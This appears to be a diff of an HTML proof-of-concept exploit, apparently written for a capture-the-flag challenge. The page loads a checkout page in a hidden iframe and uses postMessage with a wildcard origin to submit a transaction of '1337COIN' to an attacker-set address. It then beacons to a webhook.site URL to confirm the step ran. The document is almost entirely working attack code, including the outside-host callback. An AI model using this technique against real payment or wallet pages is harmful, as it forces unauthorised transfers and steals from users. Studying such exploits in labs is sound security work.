@@ -2,7 +2,15 @@
 <html>
 <body>
 <script>
+/*
+  Phase 1 – Transaction verification PoC
+  No XSS, no flag logic
+*/
 
+const ADDRESS = "114a580aae95817f9bf8d3704eb6e69417";
+const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
+
+// 1️⃣ Load checkout as admin
 const iframe = document.createElement("iframe");
 iframe.style.display = "none";
 iframe.src =
@@ -11,18 +19,22 @@ iframe.src =
 
 document.body.appendChild(iframe);
 
-
+// 2️⃣ Wait for checkout + wallet load
 setTimeout(() => {
-
+  // 3️⃣ Send transaction
   iframe.contentWindow.postMessage({
     type: "submitTransaction",
     transaction: {
-      toAddress: "114a580aae95817f9bf8d3704eb6e69417",
+      toAddress: ADDRESS,
       currency: "1337COIN",
-      amount: 1337
+      amount: 1
     }
   }, "*");
-}, 5000);
+
+  // 4️⃣ Beacon so we KNOW this step executed
+  new Image().src = WEBHOOK + "?step=transaction_sent&addr=" + ADDRESS;
+
+}, 6000);
 </script>
 </body>
 </html>
